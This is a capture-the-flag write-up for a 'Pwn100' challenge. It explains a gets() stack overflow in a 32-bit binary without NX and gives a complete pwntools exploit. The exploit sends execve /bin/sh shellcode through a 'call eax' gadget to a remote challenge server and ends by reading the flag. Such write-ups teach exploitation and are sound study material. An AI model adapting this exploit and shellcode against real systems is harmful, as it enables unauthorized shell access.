# Pwn100 (pwnage 100)
Author: muffinx

Binary type:

```
pwn100: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4eed8d04991f7b37ef1e309f1ecc983d7ff84333, not stripped
```

Binary security measurements:

```
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

The functionality is pretty straight forward:

```cpp
char *docopy()
{
  char s; // [sp+10h] [bp-18h]@1

  return gets(&s);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  docopy();
  return 0;
}
```

So just a basic stack overflow.
The only function available to us is gets().
Looking at the segments there is no wx(write/execute) segment which could be used to copy data to with gets.

```
.init         080482B0 080482D3 R . X . L dword 0001 public CODE  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
.plt          080482E0 08048320 R . X . L para  0002 public CODE  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
.text         08048320 080484C2 R . X . L para  0003 public CODE  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
.fini         080484C4 080484D8 R . X . L dword 0004 public CODE  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
.rodata       080484D8 080484E0 R . . . L dword 0005 public CONST 32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
.eh_frame_hdr 080484E0 08048514 R . . . L dword 0006 public CONST 32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
.eh_frame     08048514 080485E4 R . . . L dword 0007 public CONST 32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
.init_array   08049F08 08049F0C R W . . L dword 0008 public DATA  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
.fini_array   08049F0C 08049F10 R W . . L dword 0009 public DATA  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
.jcr          08049F10 08049F14 R W . . L dword 000A public DATA  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
.got          08049FFC 0804A000 R W . . L dword 000B public DATA  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
.got.plt      0804A000 0804A018 R W . . L dword 000C public DATA  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
.data         0804A018 0804A020 R W . . L dword 000D public DATA  32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
.bss          0804A020 0804A024 R W . . L byte  000E public BSS   32 FFFFFFFF FFFFFFFF 000D     FFFFFFFF FFFFFFFF
extern        0804A024 0804A044 ? ? ? . L para  000F public       32 FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF FFFFFFFF
```

So we have to execute our shellcode on the stack, which is actually possible since no NX is activated. So let's use some rop to jump into the stack.

When we look at the registers before the ret, we can see that eax actually points to our input.

```
EAX: 0xffffd470 ('A' <repeats 12 times>, "a")
EBX: 0xf7fa3000 --> 0x16fda8
ECX: 0xfbad2288
EDX: 0xf7fa4864 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0xffffd488 --> 0xffffd498 --> 0x0
ESP: 0xffffd460 --> 0xffffd470 ('A' <repeats 12 times>, "a")
EIP: 0x804842e (<docopy+17>:	leave)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048423 <docopy+6>:	lea    eax,[ebp-0x18]
   0x8048426 <docopy+9>:	mov    DWORD PTR [esp],eax
   0x8048429 <docopy+12>:	call   0x80482f0 <gets@plt>
=> 0x804842e <docopy+17>:	leave  
```

I found a ropgadget with that we can jump into our placed shellcode:

```
0x08048386 : call eax
```

Resulting in this exploit:


```python
#!/usr/bin/env python

from pwn import *
context(arch = 'i386', os = 'linux')

#r = process('./pwn100')
r = remote('54.153.19.139', 5252)

#gdb.attach(r, '''
#set follow-fork-mode child
#break *0x0804842F
#continue
#''')

payload = asm('xor eax,eax')
payload += asm('xor ecx,ecx')
payload += asm('xor edx,edx')
payload += asm('xor esi,esi')
payload += asm('mov eax,0x0b')
payload += asm('lea ebx,[esp-8]')
payload += asm('int 0x80')
payload += '/bin/sh\x00'

payload = ('\x90' * (28-len(payload))) + payload
payload += p32(0x08048386) # call EAX


r.sendline(payload)
r.interactive()
```

As you can see I used the shellcoding features of pwntools to build a working shellcode.
The "/bin/sh" string is at the end of the shellcode and the string pointer to it will be put
into ebx by using:

```
lea ebx,[esp-8]
```

Finally we got a shell:

```
$ cat /home/pwn100/flag
Bugs_Bunny{ohhhh_you_look_you_are_gooD_hacker_Maybe_Iknow_you:p}
```
